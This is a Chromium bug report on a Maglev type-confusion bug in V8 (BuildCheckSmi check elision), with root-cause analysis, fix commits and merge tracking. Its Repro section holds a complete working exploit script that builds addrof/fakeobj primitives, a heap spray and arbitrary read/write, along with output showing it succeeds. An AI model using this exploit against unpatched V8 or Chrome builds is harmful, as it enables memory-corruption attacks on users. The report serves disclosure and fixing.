# Type confusion in BuildCheckSmi constant folding in V8/Maglev

| Field | Value |
|-------|-------|
| **Issue ID** | [500880819](https://issues.chromium.org/issues/500880819) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | qq...@calif.io |
| **Assignee** | jg...@chromium.org |
| **Created** | 2026-04-09 |
| **Bounty** | $55,000.00 |

## Description

**Tested on:** V8 14.9.0 (candidate), HEAD `31b353261e41a9d15c829359b0d4d9e261debeb6` (2026-04-04)

`BuildCheckSmi` elides the runtime Smi check when `TryGetInt32Constant` returns a value in Smi range. `TryGetInt32Constant` recurses through the `checked_value` alternative recorded by `SetKnownValue`. When `BuildCheckNumericalValue` records a `Constant(HeapNumber 5.0)` as the `checked_value` (after `CheckFloat64SameValue` passes), `TryGetInt32Constant` follows the alternative, sees `IsInt32Double(5.0)`, and returns `5` — without verifying that the runtime representation is Smi.

The `CheckFloat64SameValue` node verifies **value equality** (`5.0 == 5.0`), not representation. Both `Smi(5)` and `HeapNumber(5.0)` pass it. The elided `CheckSmi` was the only thing preventing a HeapNumber pointer from reaching `BuildStoreTaggedFieldNoWriteBarrier` (the kSmi-field store path, which omits the write barrier under the assumption that Smis don't need one).

Result: a tagged HeapNumber pointer is written into a kSmi-typed field with no write barrier. The receiver's map is unchanged. The remembered set is not updated.

---

## Root cause

### The elision (`maglev-graph-builder.cc:4145-4146`)

```
ReduceResult MaglevGraphBuilder::BuildCheckSmi(ValueNode* object, ...) {
  ...
  // For constants, we may be able to skip the runtime check.
  if (std::optional<int32_t> constant_value = TryGetInt32Constant(object)) {
    if (Smi::IsValid(constant_value.value())) return object;   // ← elide CheckSmi
  }
  ...
}

```

This is sound when `object` *is* a constant node. It is unsound when `object` is a runtime value whose `checked_value` *alternative* is a constant.

### The recursion (`maglev-reducer-inl.h:722-723`)

```
std::optional<int32_t> MaglevReducer<BaseT>::TryGetInt32Constant(ValueNode* value) {
  switch (value->opcode()) {
    case Opcode::kConstant: {
      compiler::ObjectRef object = value->Cast<Constant>()->object();
      if (object.IsHeapNumber() &&
          IsInt32Double(object.AsHeapNumber().value())) {       // ← 5.0 → true
        return static_cast<int32_t>(object.AsHeapNumber().value());
      }
      ...
    }
    ...
  }
  if (auto c = TryGetConstantAlternative(value)) {
    return TryGetInt32Constant(*c);                             // ← recurse on checked_value
  }
  return {};
}

```

`TryGetConstantAlternative` (`maglev-reducer-inl.h:480-490`) reads `info->alternative().checked_value()` and returns it if it's a constant node. The recursive call then hits the `kConstant` case for the HeapNumber.

### Where `checked_value` is set (`maglev-graph-builder.cc:12268-12271`)

```
ReduceResult MaglevGraphBuilder::BuildCheckNumericalValue(...) {
  ...
    RETURN_IF_ABORT(
        AddNewNode<CheckFloat64SameValue>({node}, ref_value, reason));
  }

  reducer_.SetKnownValue(node, ref, NodeType::kNumber);          // ← here
  return ReduceResult::Done();
}

```

`SetKnownValue` (`maglev-reducer-inl.h:1396`) does:

```
known_info->alternative().set_checked_value(GetConstant(ref));

```

`ref` is the compile-time PropertyCell value — a `HeapNumber 5.0` object. `GetConstant(ref)` produces `Constant(HN 5.0)`. This is recorded as the `checked_value` for the runtime node.

The implicit contract violated: `checked_value` was meant to record "after this check, the runtime value is *equal to* this constant", but `TryGetInt32Constant` reads it as "the runtime value *is* this constant (same representation)".

### The sink (`maglev-graph-builder.cc:5359-5421`)

```
ValueNode* value = GetAccumulator();                           // raw tagged
...
if (field_representation.IsSmi()) {
  RETURN_IF_ABORT(GetAccumulatorSmi(...));   // ← inserts CheckSmi (or tries to)
                                             //   result IGNORED — only the side
                                             //   effect (CheckSmi node) matters
}
...
if (field_representation.IsSmi()) {
  RETURN_IF_ABORT(BuildStoreTaggedFieldNoWriteBarrier(
      store_target, value, field_index.offset(), store_mode, name));
}

```

`GetAccumulatorSmi` → `BuildCheckSmi`. With the check elided, `value` (the unmodified accumulator, holding a HeapNumber pointer) flows directly to `BuildStoreTaggedFieldNoWriteBarrier`.

---

## Impact

- **`addrof`** — A Maglev-compiled load of `obj.f` emits `UnsafeSmiUntag` (map says kSmi, no tag check). Reading the corrupted field returns `compressed_ptr >> 1`. Deterministic, repeatable.
- **UAF** — `obj` in old-gen, fresh HN in young-gen, no remembered-set entry. Minor GC frees the HN; `obj.f` dangles. Spray new-space → `fakeobj` → in-cage arbitrary read/write.
- **Arbitrary Read/Write** demonstrated with zero flags (`./d8 poc.js`), quite reliable.

## Repro

```
// Two triggers of the same bug:
//   #1: corrupt(obj, HN5,    true) — old→old, GC-safe, pure type confusion.
//       addrof(obj) → UnsafeSmiUntag → leaks HN5's compressed ptr.
//   #2: corrupt(obj, freshHN, true) — old→young, missing WB → dangling → fakeobj.
//
// Trigger #1 is allocation-free (HN5 exists, addrof returns Smi-range int,
// recovery is integer math) → young-gen bump pointer unchanged → freshHN lands
// at the same young-gen offset as the single-trigger version.
//
// No eval closures, no scan window, no hardcoded HN5 neighborhood. The only
// build-specific constant is JSARRAY_DBL_MAP (RO-root, run-stable, standard).
//
// Run: d8 poc.js

const JSARRAY_DBL_MAP = 0x0100d0d9;
const FAKE_LEN        = 0x100;
const WARMUP_N        = 30000;

let f64 = new Float64Array(1);
let u32 = new Uint32Array(f64.buffer);
function itof(lo, hi) { u32[0]=lo>>>0; u32[1]=hi>>>0; return f64[0]; }
function ftoi(d) { f64[0]=d; return [u32[0]>>>0, u32[1]>>>0]; }

const SPRAY_D = itof(FAKE_LEN << 1, JSARRAY_DBL_MAP);

// ─── Setup ───
let __f = new Float64Array(1); __f[0] = 5;
let HN5 = __f[0];
globalThis.G = HN5;

let obj = { smiField: 1 };
obj.smiField = 2; obj.smiField = 3;

// ─── Organic promotion ───
for (let i = 0; i < 400; i++) { new Array(10000).fill(1.1); }

// ─── Functions ───
function sh(o, x, c) { if (c) o.smiField = x; }
sh(obj, 5, true); sh(obj, 5, true); sh(obj, 5, true);

function corrupt(o, x, c) { G = x; sh(o, x, c); }

// addrof: Maglev trusts kSmi map → LoadTaggedField → UnsafeSmiUntag (no tag
// check) → Int32Add. `+7` survives identity-folding (+0, |0, *1 all fold).
// Recovery: ptr = ((r-7)<<1)|1.  HN5_ptr ≈ 0x012xxxxx → >>1 ≈ 9M → Smi-range.
function addrof(o) { return o.smiField + 7; }
addrof(obj); addrof(obj); addrof(obj);

// ─── Warmup: tier BOTH corrupt and addrof to Maglev ───
// addrof trained on Smi(5) → returns 12. Loop allocates nothing.
for (let i = 0; i < WARMUP_N; i++) {
  corrupt(obj, HN5, false);
  addrof(obj);
  if ((i & 15) === 0) sh(obj, 5, true);
}

// ─── Trigger #1: addrof(HN5) — ALLOCATION-FREE ───
// HN5 is old-gen, obj is old-gen → WriteBarrier::IsRequired = false. The
// missing WB is harmless here. Type confusion alone: CheckSmi elided, HN5's
// tagged ptr lands in the kSmi field, map unchanged. addrof's CheckMaps
// passes, UnsafeSmiUntag shifts the raw bits. No deopt — corrupt stays Maglev.
//
// NO IIFE: HN5 is already a tagged HN (script-scope let, loaded via context
// slot). OSR'd top-level passes it tagged — no __f[0]-style unboxing risk.
// IIFE would allocate a closure object (~28B young-gen) → shifts freshHN.
//
// NO PRINT: string concat + toString allocate. Defer all output.
//
// leaked ≈ (0x012xxxxx >> 1) + 7 ≈ 9M → Smi. Recovery math stays Smi-range.
// `let` slots pre-reserved in script context at parse — assignment is no-alloc.
corrupt(obj, HN5, true);
let leaked = addrof(obj);
let HN5_ADDR = (((leaked - 7) << 1) | 1) >>> 0;
obj.smiField = 5;          // reset: store IC sees kSmi map + Smi value → clean

// ─── Trigger #2: dangling ───
// freshHN is young-gen → old→young store, missing WB → no remembered-set entry.
(function(){ corrupt(obj, __f[0], true); })();

// ─── Stack scrub ───
(function r(n){return n>0?r(n-1)+n:0;})(400);

// ─── Spray (organic minor GCs mid-loop) ───
let pads = [];
for (let j = 0; j < 200; j++) {
  let a = new Array(1000);
  for (let i = 0; i < 1000; i++) a[i] = SPRAY_D;
  pads.push(a);
}

// ─── Verify fake JSArray ───
let fake = obj.smiField;
if (typeof fake === "number") {
  print("\n[fail] HN survived (typeof=number, val=" + fake + ")");
  throw "UAF didn't fire";
}
let len;
try { len = fake.length; } catch(e) {
  print("\n[fail] fake.length threw: " + e);
  throw "fake malformed";
}
print("\n[fake] typeof=" + typeof fake + " length=" + len + " (expect " + FAKE_LEN + ")");
if (len !== FAKE_LEN) {
  print("[fail] alignment/spray miss");
  throw "spray miss";
}
print("[fake] *** fake JSArray landed ***");

// ─── Initial read (elements still = JSARRAY_DBL_MAP) ───
let v_init = fake[0];
let [li,hi] = ftoi(v_init);
print("[read] fake[0] @ MAP+7 = " + v_init);
print("[read]   hex 0x" + hi.toString(16).padStart(8,'0') + "_" + li.toString(16).padStart(8,'0'));

// ─── Spray-scan: find length-controlling slot (uses fake.length only — no
// elements deref → safe in OSR'd code, no map check on elements) ───
const PROBE_D = itof(0x777 << 1, JSARRAY_DBL_MAP);
let fj=-1, fk=-1;
scan: for (let j = 0; j < 200; j++) {
  let a = pads[j];
  for (let k = 0; k < 1000; k++) {
    a[k] = PROBE_D;
    if (fake.length === 0x777) { fj=j; fk=k; a[k]=SPRAY_D; break scan; }
    a[k] = SPRAY_D;
  }
}
if (fj < 0) {
  print("\n[fail] scan miss — spray not writable at dangling");
  throw "scan miss";
}
print("[scan] *** pads[" + fj + "][" + fk + "] controls fake.length ***");

// ─── Retarget + arb R/W demo (IIFE → Ignition → no elements-map check) ───
// fake[0] reads 8B at elements_tagged + 7. HN.value at HN_tagged + 3.
// elements = HN5_ADDR - 4 → reads at HN5_ADDR + 3 = HN5.value.
//
// IIFE because optimized fake[0] (Maglev/TF) emits CheckMaps on fake.elements
// expecting FixedDoubleArray. elements is now HN5_ADDR-4 (a HeapNumber-ish
// region) → CHECK or deopt. Ignition's keyed-load IC trusts the receiver map,
// dereferences elements blindly. One call → cold → Ignition.
let _pad = pads[fj], _slot = fk-1;
let result = (function(){
  _pad[_slot] = itof(FAKE_LEN<<1, (HN5_ADDR - 4) >>> 0);
  let v = fake[0];
  if (v !== 5) return v;        // wrong addr or HN5 moved (major GC)
  fake[0] = 1337.42;
  return v;
})();

if (result !== 5) {
  print("\n[fail] read at leaked addr = " + result + " (expected 5)");
  print("       HN5_ADDR stale? major GC moved HN5 between leak and now?");
  throw "addr stale";
}

let hn5_now = HN5 + 0;
// (deferred from trigger #1 — printing there would have allocated strings
// in young-gen before freshHN, shifting its alignment)
print("\n[addrof] leaked raw = " + leaked + " (12 would mean bug didn't fire)");
print("[addrof] HN5_ADDR   = 0x" + HN5_ADDR.toString(16) + " (UnsafeSmiUntag, no scan)");
print("\n[!!!] ARBITRARY READ:  fake[0] @ leaked 0x" + HN5_ADDR.toString(16) + " = 5.0");
print("[!!!] ARBITRARY WRITE: fake[0] = 1337.42 → HN5+0 = " + hn5_now);
print("[!!!]   v_init (Map bytes @ 0x" + JSARRAY_DBL_MAP.toString(16) + "+7) = " + v_init);
print("[!!!]   HN5+0  (after write, independent JS read)            = " + hn5_now);

if (hn5_now === 1337.42) {
  print("  *** ARB R/W achieved ***");
}


```
### Debug (show root cause)

```
❯ ./v8/out/x64.debug/d8 poc/maglev-checksmi-elision/poc.js 
#
# Fatal error in ../../src/heap/heap.cc, line 6784
# Check failed: !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)).
#
#
#
#FailureMessage Object: 0x7ffeb5d87868
==== C stack trace ===============================

    /home/pop/sec/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x29) [0x735b27276179]
    /home/pop/sec/v8/v8/out/x64.debug/libv8_libplatform.so(+0x4e2cd) [0x735b173e12cd]
    /home/pop/sec/v8/v8/out/x64.debug/libv8_libbase.so(v8::base::PrintStackTraceIfAvailable()+0x14) [0x735b272491e4]
    /home/pop/sec/v8/v8/out/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x1f9) [0x735b27249999]
    /home/pop/sec/v8/v8/out/x64.debug/libv8.so(v8::internal::Heap::VerifySkippedWriteBarrier(unsigned long, unsigned long)+0x12b) [0x735b218fc10b]
    [0x735b7fc9441b]
[1]    1417951 trace trap (core dumped)  ./v8/out/x64.debug/d8 


```
### Release (Arbitrary R/W)

```
❯ ./v8/out/ASAN_RELEASE/d8 audit-notes/maglev-checksmi-elision/poc-organic-honest.js

[fake] typeof=object length=256 (expect 256)
[fake] *** fake JSArray landed ***
[read] fake[0] @ MAP+7 = 1.6291488275493544e-260
[read]   hex 0x0a0007ff_1100084b
[scan] *** pads[104][716] controls fake.length ***

[addrof] leaked raw = 9582111 (12 would mean bug didn't fire)
[addrof] HN5_ADDR   = 0x1246c31 (UnsafeSmiUntag, no scan)

[!!!] ARBITRARY READ:  fake[0] @ leaked 0x1246c31 = 5.0
[!!!] ARBITRARY WRITE: fake[0] = 1337.42 → HN5+0 = 1337.42
[!!!]   v_init (Map bytes @ 0x100d0d9+7) = 1.6291488275493544e-260
[!!!]   HN5+0  (after write, independent JS read)            = 1337.42
  *** ARB R/W achieved ***

```
## Suggested fix

The issue is introduced by `6469250a124a`: [maglev] Improve constant handling for BuildCheckSmi and the Array ctor, 2025-09-26, [crrev.com/c/6988172](https://crrev.com/c/6988172).

`TryGetInt32Constant` answers "what int32 *value* does this node hold?" — it does not prove the runtime *representation* is Smi. `BuildCheckSmi` should only elide when `object` itself is a constant node, not when its `checked_value` alternative is:

```
if (IsConstantNode(object->opcode())) {
  if (std::optional<int32_t> c = TryGetInt32Constant(object)) {
    if (Smi::IsValid(c.value())) return object;
  }
}

```

## Attachments

- [exp_linux_147_vrp.html](attachments/exp_linux_147_vrp.html) (text/html, 9.8 KB)

## Timeline

### fl...@google.com (2026-04-09)

Security shepherd here.

Passing to the V8 triage folks.

### cl...@appspot.gserviceaccount.com (2026-04-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6576911102803968.

### 24...@project.gserviceaccount.com (2026-04-09)

ClusterFuzz testcase 6576911102803968 appears to be flaky, updating reproducibility hotlist.

### 24...@project.gserviceaccount.com (2026-04-09)

Detailed Report: https://clusterfuzz.com/testcase?key=6576911102803968

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)) in heap.cc
  v8::internal::Heap::VerifySkippedWriteBarrier
  Builtins_InterpreterEntryTrampoline
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&revision=106365

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6576911102803968

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### is...@chromium.org (2026-04-09)

Thank you for the report!

Assigning to the culprit CL author.

### qq...@calif.io (2026-04-09)

After a deeper dig, this seems like an incomplete fix for [crbug.com/490558172](https://crbug.com/490558172) bug class — RecordSmiUse only handles Phis; the HeapNumber-branch producer makes the same elision fire on non-Phi nodes.

---

Quang Luong of Calif.IO in collaboration with Claude and Anthropic Research

### ch...@google.com (2026-04-10)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-10)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### jg...@chromium.org (2026-04-14)

Thank you for the report. The problem is that

```
  if (std::optional<int32_t> constant_value = TryGetInt32Constant(object)) {
    if (Smi::IsValid(constant_value.value())) return object;
  }

```

is unsound when `object->value_representation()` is kTagged - that is the only case when value-identity is insufficient. See

```
    case ValueRepresentation::kTagged:
      AddNewNodeNoInputConversion<CheckSmi>({object});
      break;

```

which deopts if object is not a smi. The proposed fix is to additionally guard the `TryGetInt32Constant` branch with `object->value_representation() != ValueRepresentation::kTagged`.

### dx...@google.com (2026-04-14)

Project: v8/v8  

Branch:  main  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7761542>

[maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

---


Expand for full commit details
```
     
    The elision added in CL 6988172 (commit 6469250a124a) skipped the 
    runtime check whenever TryGetInt32Constant(object) returned a value in 
    Smi range. For non-tagged input representations this is sound, because 
    the switch below emits a value-range check (CheckInt32IsSmi / 
    CheckUint32IsSmi / CheckFloat64IsSmi / CheckHoleyFloat64IsSmi / 
    CheckIntPtrIsSmi), which is exactly what Smi::IsValid proves. 
     
    For kTagged inputs the emitted check is CheckSmi, a tag-bit check. 
    Value-equivalence does not imply Smi tagging: a tagged node can be equal 
    in value to a Smi-range constant while actually holding a HeapNumber at 
    runtime. This happens when BuildCheckNumericalValue's HeapNumber branch 
    records a Constant(HeapNumber N) in the node's checked_value alternative 
    after a CheckFloat64SameValue; since CheckFloat64SameValue only proves 
    numeric equality, both Smi(N) and HeapNumber(N) pass it. 
    TryGetInt32Constant recurses through the alternative and returns N, so 
    the elision drops the tag check and a HeapNumber pointer can flow into 
    downstream consumers (e.g. the kSmi-field store path via 
    StoreTaggedFieldNoWriteBarrier), causing a type confusion and a missing 
    write barrier. 
     
    Gate the elision on value_representation() != kTagged. For tagged Smi 
    inputs the earlier StaticTypeIs(kSmi) / EnsureType(kSmi) early returns 
    already handle elision via type-system facts, which carry the tag 
    guarantee the value-equivalence alternative does not. 
     
    Fixed: 500880819 
    Change-Id: Ida0c18551974c5d861e0aed6f881439d04598c0b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7761542 
    Reviewed-by: Victor Gomes <victorgomes@chromium.org> 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106450}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/maglev/regress/regress-500880819.js`
- A `test/mjsunit/maglev/regress/regress-501789186.js`

---

Hash: [b9be4febd638434a37a4215b8ea9ae1f8fab4df6](https://chromiumdash.appspot.com/commit/b9be4febd638434a37a4215b8ea9ae1f8fab4df6)  

Date: Tue Apr 14 06:46:10 2026


---

### ch...@google.com (2026-04-15)

This is sufficiently serious that it should be merged to M146. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

This is sufficiently serious that it should be merged to M147. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M147. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to M148. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M148. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

### ch...@google.com (2026-04-15)

**M146** merge request created. **Please update [crbug/502820503](https://crbug.com/502820503) to have this merge reviewed.**

### ch...@google.com (2026-04-15)

**M147** merge request created. **Please update [crbug/502819756](https://crbug.com/502819756) to have this merge reviewed.**

### ch...@google.com (2026-04-15)

**M148** merge request created. **Please update [crbug/502819376](https://crbug.com/502819376) to have this merge reviewed.**

### 24...@project.gserviceaccount.com (2026-04-15)

ClusterFuzz testcase 6667179470651392 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=106449:106450

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### qq...@calif.io (2026-04-18)

Thanks for the fix!

---

For VRP panel's reward determination: please check <https://issues.chromium.org/issues/501147587#comment15> to see the exploit chain enabled by this bug (reported by me; essentially in the same batch but I split it to 2 tickets for easier triaging).

### dx...@google.com (2026-04-23)

Project: v8/v8  

Branch:  refs/branch-heads/14.7  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7775550>

Merged: [maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

---


Expand for full commit details
```
     
    The elision added in CL 6988172 (commit 6469250a124a) skipped the 
    runtime check whenever TryGetInt32Constant(object) returned a value in 
    Smi range. For non-tagged input representations this is sound, because 
    the switch below emits a value-range check (CheckInt32IsSmi / 
    CheckUint32IsSmi / CheckFloat64IsSmi / CheckHoleyFloat64IsSmi / 
    CheckIntPtrIsSmi), which is exactly what Smi::IsValid proves. 
     
    For kTagged inputs the emitted check is CheckSmi, a tag-bit check. 
    Value-equivalence does not imply Smi tagging: a tagged node can be equal 
    in value to a Smi-range constant while actually holding a HeapNumber at 
    runtime. This happens when BuildCheckNumericalValue's HeapNumber branch 
    records a Constant(HeapNumber N) in the node's checked_value alternative 
    after a CheckFloat64SameValue; since CheckFloat64SameValue only proves 
    numeric equality, both Smi(N) and HeapNumber(N) pass it. 
    TryGetInt32Constant recurses through the alternative and returns N, so 
    the elision drops the tag check and a HeapNumber pointer can flow into 
    downstream consumers (e.g. the kSmi-field store path via 
    StoreTaggedFieldNoWriteBarrier), causing a type confusion and a missing 
    write barrier. 
     
    Gate the elision on value_representation() != kTagged. For tagged Smi 
    inputs the earlier StaticTypeIs(kSmi) / EnsureType(kSmi) early returns 
    already handle elision via type-system facts, which carry the tag 
    guarantee the value-equivalence alternative does not. 
     
    Cherry-picked from 
    https://chromium-review.googlesource.com/c/v8/v8/+/7761542 
     
    Bug: 500880819 
    Fixed: 502819756 
    Change-Id: Ida0c18551974c5d861e0aed6f881439d04598c0b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7775550 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.7@{#40} 
    Cr-Branched-From: 723547b98d2e75cb85556ab85479688c9fbe2f1e-refs/heads/14.7.173@{#1} 
    Cr-Branched-From: 3fc49d4c4cd9e6202fe21f5925899292ffadb20a-refs/heads/main@{#105661}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/maglev/regress/regress-500880819.js`
- A `test/mjsunit/maglev/regress/regress-501789186.js`

---

Hash: [cc9a97f192319ed218c191fa20cbecd1bf51cb71](https://chromiumdash.appspot.com/commit/cc9a97f192319ed218c191fa20cbecd1bf51cb71)  

Date: Tue Apr 14 06:46:10 2026


---

### dx...@google.com (2026-04-23)

Project: v8/v8  

Branch:  refs/branch-heads/14.8  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7775551>

Merged: [maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

---


Expand for full commit details
```
     
    The elision added in CL 6988172 (commit 6469250a124a) skipped the 
    runtime check whenever TryGetInt32Constant(object) returned a value in 
    Smi range. For non-tagged input representations this is sound, because 
    the switch below emits a value-range check (CheckInt32IsSmi / 
    CheckUint32IsSmi / CheckFloat64IsSmi / CheckHoleyFloat64IsSmi / 
    CheckIntPtrIsSmi), which is exactly what Smi::IsValid proves. 
     
    For kTagged inputs the emitted check is CheckSmi, a tag-bit check. 
    Value-equivalence does not imply Smi tagging: a tagged node can be equal 
    in value to a Smi-range constant while actually holding a HeapNumber at 
    runtime. This happens when BuildCheckNumericalValue's HeapNumber branch 
    records a Constant(HeapNumber N) in the node's checked_value alternative 
    after a CheckFloat64SameValue; since CheckFloat64SameValue only proves 
    numeric equality, both Smi(N) and HeapNumber(N) pass it. 
    TryGetInt32Constant recurses through the alternative and returns N, so 
    the elision drops the tag check and a HeapNumber pointer can flow into 
    downstream consumers (e.g. the kSmi-field store path via 
    StoreTaggedFieldNoWriteBarrier), causing a type confusion and a missing 
    write barrier. 
     
    Gate the elision on value_representation() != kTagged. For tagged Smi 
    inputs the earlier StaticTypeIs(kSmi) / EnsureType(kSmi) early returns 
    already handle elision via type-system facts, which carry the tag 
    guarantee the value-equivalence alternative does not. 
     
    Cherry-picked from 
    https://chromium-review.googlesource.com/c/v8/v8/+/7761542 
     
    Bug: 500880819 
    Fixed: 502819376 
    Change-Id: Ida0c18551974c5d861e0aed6f881439d04598c0b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7775551 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.8@{#14} 
    Cr-Branched-From: f9659283a5f8d42b3c09228cf5df606fcaf47a3d-refs/heads/14.8.178@{#1} 
    Cr-Branched-From: 141232520dc4910401240c531db3af36910a0fd1-refs/heads/main@{#106240}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/maglev/regress/regress-500880819.js`
- A `test/mjsunit/maglev/regress/regress-501789186.js`

---

Hash: [9703a4d819e2a8952ef846ab49cab9fe2ce6989c](https://chromiumdash.appspot.com/commit/9703a4d819e2a8952ef846ab49cab9fe2ce6989c)  

Date: Tue Apr 14 06:46:10 2026


---

### dx...@google.com (2026-04-23)

Project: v8/v8  

Branch:  refs/branch-heads/14.6  

Author:  Jakob Linke [jgruber@chromium.org](mailto:jgruber@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7778108>

Merged: [maglev] Restrict BuildCheckSmi constant elision to non-tagged inputs

---


Expand for full commit details
```
     
    The elision added in CL 6988172 (commit 6469250a124a) skipped the 
    runtime check whenever TryGetInt32Constant(object) returned a value in 
    Smi range. For non-tagged input representations this is sound, because 
    the switch below emits a value-range check (CheckInt32IsSmi / 
    CheckUint32IsSmi / CheckFloat64IsSmi / CheckHoleyFloat64IsSmi / 
    CheckIntPtrIsSmi), which is exactly what Smi::IsValid proves. 
     
    For kTagged inputs the emitted check is CheckSmi, a tag-bit check. 
    Value-equivalence does not imply Smi tagging: a tagged node can be equal 
    in value to a Smi-range constant while actually holding a HeapNumber at 
    runtime. This happens when BuildCheckNumericalValue's HeapNumber branch 
    records a Constant(HeapNumber N) in the node's checked_value alternative 
    after a CheckFloat64SameValue; since CheckFloat64SameValue only proves 
    numeric equality, both Smi(N) and HeapNumber(N) pass it. 
    TryGetInt32Constant recurses through the alternative and returns N, so 
    the elision drops the tag check and a HeapNumber pointer can flow into 
    downstream consumers (e.g. the kSmi-field store path via 
    StoreTaggedFieldNoWriteBarrier), causing a type confusion and a missing 
    write barrier. 
     
    Gate the elision on value_representation() != kTagged. For tagged Smi 
    inputs the earlier StaticTypeIs(kSmi) / EnsureType(kSmi) early returns 
    already handle elision via type-system facts, which carry the tag 
    guarantee the value-equivalence alternative does not. 
     
    Cherry-picked from 
    https://chromium-review.googlesource.com/c/v8/v8/+/7761542 
     
    Bug: 500880819 
    Fixed: 502820503 
    Change-Id: Ida0c18551974c5d861e0aed6f881439d04598c0b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7778108 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Auto-Submit: Jakob Linke <jgruber@chromium.org> 
    Commit-Queue: Jakob Linke <jgruber@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/14.6@{#67} 
    Cr-Branched-From: e04c3a1a2543bdbee7beac8846c9cbe8f657636f-refs/heads/14.6.202@{#1} 
    Cr-Branched-From: 3b0b01e6594ec362369dc16f069012a81748c8ba-refs/heads/main@{#105132}

```

---

Files:

- M `src/maglev/maglev-graph-builder.cc`
- A `test/mjsunit/maglev/regress/regress-500880819.js`
- A `test/mjsunit/maglev/regress/regress-501789186.js`

---

Hash: [417e41688f88404cc00e48ea405aebbedc65e40d](https://chromiumdash.appspot.com/commit/417e41688f88404cc00e48ea405aebbedc65e40d)  

Date: Mon Apr 20 09:29:47 2026


---

### pe...@google.com (2026-04-23)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ct...@chromium.org (2026-04-24)

[VRP] Reporter: Sorry for the delay in getting back to you. I'm working on validating your provided exploit. Per our [VRP FAQ](https://chromium.googlesource.com/chromium/src/+/main/docs/security/vrp-faq.md#can-i-submit-my-report_s_and-provide-a-working-exploit-later:~:text=The%20exploit%20must%20work%20against%20a%20released%20Chrome%20build) we want exploits to work against a released Chrome build, rather than d8 (for renderer exploits this can use the `--no-sandbox` flag to allow executing a shell command as the user to demonstrate full RCE). Do you have a functional exploit against a released Chrome build?

### qq...@calif.io (2026-04-24)

Hello, I don't have functional for Chromium yet. The other submission targets the <https://bughunters.google.com/about/rules/chrome-friends/chrome-vulnerability-reward-program-rules#v8-sandbox-bypass-rewards>.

---

